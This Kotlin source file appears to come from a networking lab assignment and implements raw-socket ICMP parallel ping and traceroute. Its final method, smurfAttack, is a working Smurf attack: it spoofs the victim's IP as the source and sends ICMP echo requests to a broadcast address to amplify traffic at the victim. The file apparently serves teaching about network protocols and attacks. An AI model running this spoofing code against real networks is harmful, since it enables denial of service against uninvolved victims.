package sspoirs.lr5

import com.sun.jna.Memory
import com.sun.jna.ptr.IntByReference
import sspoirs.common.NetworkUtils
import java.net.InetAddress
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import kotlin.random.Random

class IcmpService : AutoCloseable {
    private val net = NativeNet.instance
    private val socket = net.socket(NativeNet.AF_INET, NativeNet.SOCK_RAW, NativeNet.IPPROTO_ICMP)

    init {
        if (socket < 0) {
            val err = net.getLastError()
            throw RuntimeException("Failed to create raw socket. Error code: $err. Try running as Admin/Root.")
        }
    }

    override fun close() {
        net.close(socket)
    }

    /**
     * Parallel Ping Implementation using MSG_PEEK
     */
    fun parallelPing(hosts: List<String>) {
        flushSocket() // Clear stale packets before starting
        val executor = Executors.newFixedThreadPool(hosts.size)
        println("Starting parallel ping for ${hosts.size} hosts...")

        hosts.forEach { host ->
            executor.execute {
                try {
                    val result = pingHost(host)
                    NetworkUtils.log("[PING] $host: $result")
                } catch (e: Exception) {
                    NetworkUtils.log("[PING] $host: Error - ${e.message}")
                }
            }
        }

        executor.shutdown()
        executor.awaitTermination(1, TimeUnit.MINUTES)
    }

    private fun pingHost(host: String): String {
        val targetAddr = InetAddress.getByName(host)
        val id = (Random.nextInt(0, 0xFFFF)).toShort()
        val seq: Short = 1
        
        // Payload with timestamp
        val sendTime = System.currentTimeMillis()
        val payload = ByteBuffer.allocate(8).putLong(sendTime).array()
        
        val request = IcmpPacket.createEchoRequest(id, seq, payload).toByteArray()
        
        val dest = NativeNet.SockAddrIn().apply {
            sin_family = NativeNet.AF_INET.toShort()
            sin_addr = targetAddr.address
        }

        val sent = net.sendto(socket, Memory(request.size.toLong()).apply { write(0, request, 0, request.size) }, 
                             request.size, 0, dest, dest.size())
        
        if (sent < 0) return "Send failed: ${net.getLastError()}"

        val buffer = Memory(65536)
        
        while (System.currentTimeMillis() - sendTime < 3000) {
            val fromAddr = NativeNet.SockAddrIn()
            val fromLen = IntByReference(fromAddr.size())
            
            // MSG_PEEK to look at the packet without removing it
            val bytesRead = net.recvfrom(socket, buffer, buffer.size().toInt(), NativeNet.MSG_PEEK, fromAddr, fromLen)
            
            if (bytesRead > 0) {
                val data = buffer.getByteArray(0, bytesRead)
                val ipHeaderLen = (data[0].toInt() and 0x0F) * 4
                
                if (data.size >= ipHeaderLen + 8) {
                    val icmp = try { IcmpPacket.parse(data, ipHeaderLen) } catch (e: Exception) { null }
                    
                    if (icmp != null) {
                        // 1. Matches our ID - take it!
                        if (icmp.type == IcmpPacket.TYPE_ECHO_REPLY && icmp.identifier == id) {
                            net.recvfrom(socket, buffer, buffer.size().toInt(), 0, null, IntByReference(0))
                            val rcvTimestamp = if (icmp.data.size >= 8) ByteBuffer.wrap(icmp.data).long else 0L
                            val rtt = if (rcvTimestamp > 0) System.currentTimeMillis() - rcvTimestamp else System.currentTimeMillis() - sendTime
                            val fromIp = InetAddress.getByAddress(fromAddr.sin_addr).hostAddress
                            return "Reply from $fromIp: bytes=${icmp.data.size} RTT=${rtt}ms"
                        }

                        // 2. It's not ours. Should we remove it to unblock the queue?
                        val isStale = if (icmp.data.size >= 8) {
                            val packetTs = ByteBuffer.wrap(icmp.data).long
                            (System.currentTimeMillis() - packetTs) > 5000 // Packet is older than 5s
                        } else false

                        val isNotEchoReply = icmp.type != IcmpPacket.TYPE_ECHO_REPLY

                        if (isStale || isNotEchoReply) {
                            // This is garbage or stale packet from a timed-out thread. Remove it.
                            net.recvfrom(socket, buffer, buffer.size().toInt(), 0, null, IntByReference(0))
                            continue // Re-peek immediately
                        }
                    } else {
                        // Malformed packet at the head - remove it
                        net.recvfrom(socket, buffer, buffer.size().toInt(), 0, null, IntByReference(0))
                        continue
                    }
                } else {
                    // Too small packet at the head - remove it
                    net.recvfrom(socket, buffer, buffer.size().toInt(), 0, null, IntByReference(0))
                    continue
                }
            }
            Thread.sleep(1)
        }
        
        return "Request timed out"
    }

    private fun flushSocket() {
        val buffer = Memory(65536)
        while (true) {
            val read = net.recvfrom(socket, buffer, buffer.size().toInt(), 0, null, IntByReference(0))
            if (read <= 0) break
        }
    }

    /**
     * Traceroute Implementation
     */
    fun traceroute(host: String, maxHops: Int = 30) {
        val targetAddr = InetAddress.getByName(host)
        println("Traceroute to $host (${targetAddr.hostAddress}), $maxHops hops max:")

        for (ttl in 1..maxHops) {
            val result = probeHop(targetAddr, ttl)
            println("${ttl.toString().padStart(2)}  $result")
            if (result.contains("Reached") || result.contains("Echo Reply")) break
        }
    }

    private fun probeHop(target: InetAddress, ttl: Int): String {
        // Set TTL on socket
        val ttlPtr = Memory(4).apply { setInt(0, ttl) }
        net.setsockopt(socket, net.getIpProtoIp(), net.getIpTtl(), ttlPtr, 4)
        
        val id = (ttl + 1000).toShort()
        val startTime = System.currentTimeMillis()
        val payload = ByteBuffer.allocate(8).putLong(startTime).array()
        val request = IcmpPacket.createEchoRequest(id, 1, payload).toByteArray()
        
        val dest = NativeNet.SockAddrIn().apply {
            sin_family = NativeNet.AF_INET.toShort()
            sin_addr = target.address
        }

        net.sendto(socket, Memory(request.size.toLong()).apply { write(0, request, 0, request.size) }, 
                   request.size, 0, dest, dest.size())
        
        val buffer = Memory(65536)
        val fromAddr = NativeNet.SockAddrIn()
        val fromLen = IntByReference(fromAddr.size())

        while (System.currentTimeMillis() - startTime < 2000) {
            val bytesRead = net.recvfrom(socket, buffer, buffer.size().toInt(), 0, fromAddr, fromLen)
            if (bytesRead > 0) {
                val endTime = System.currentTimeMillis()
                val data = buffer.getByteArray(0, bytesRead)
                val ipHeaderLen = (data[0].toInt() and 0x0F) * 4
                val icmp = try { IcmpPacket.parse(data, ipHeaderLen) } catch (e: Exception) { null }
                
                if (icmp != null) {
                    val hopIp = InetAddress.getByAddress(fromAddr.sin_addr).hostAddress
                    val rtt = endTime - startTime
                    
                    when (icmp.type) {
                        IcmpPacket.TYPE_ECHO_REPLY -> {
                            if (icmp.identifier == id) return "$hopIp (Reached) - $rtt ms"
                        }
                        IcmpPacket.TYPE_TIME_EXCEEDED -> {
                            // Standard traceroute response
                            return "$hopIp - $rtt ms"
                        }
                        IcmpPacket.TYPE_DEST_UNREACHABLE -> return "$hopIp (Unreachable) - $rtt ms"
                    }
                }
            }
            Thread.sleep(1)
        }
        return "* * *"
    }

    /**
     * Smurf Attack Implementation
     */
    fun smurfAttack(victimIp: String, broadcastIp: String, count: Int = 10) {
        val smurfSocket = net.socket(NativeNet.AF_INET, NativeNet.SOCK_RAW, NativeNet.IPPROTO_ICMP)
        val one = Memory(4).apply { setInt(0, 1) }
        net.setsockopt(smurfSocket, net.getIpProtoIp(), net.getIpHdrIncl(), one, 4)
        
        println("Sending $count Smurf packets: Victim=$victimIp -> Broadcast=$broadcastIp")
        
        val icmpReq = IcmpPacket.createEchoRequest(0x1337, 1, "SMURF".toByteArray()).toByteArray()
        val ipHeader = IpHeader(victimIp, broadcastIp).toByteArray(icmpReq.size)
        
        val packet = ipHeader + icmpReq
        val dest = NativeNet.SockAddrIn().apply {
            sin_family = NativeNet.AF_INET.toShort()
            sin_addr = InetAddress.getByName(broadcastIp).address
        }

        repeat(count) {
            net.sendto(smurfSocket, Memory(packet.size.toLong()).apply { write(0, packet, 0, packet.size) }, 
                       packet.size, 0, dest, dest.size())
            Thread.sleep(100)
        }
        
        net.close(smurfSocket)
        println("Attack finished.")
    }
}
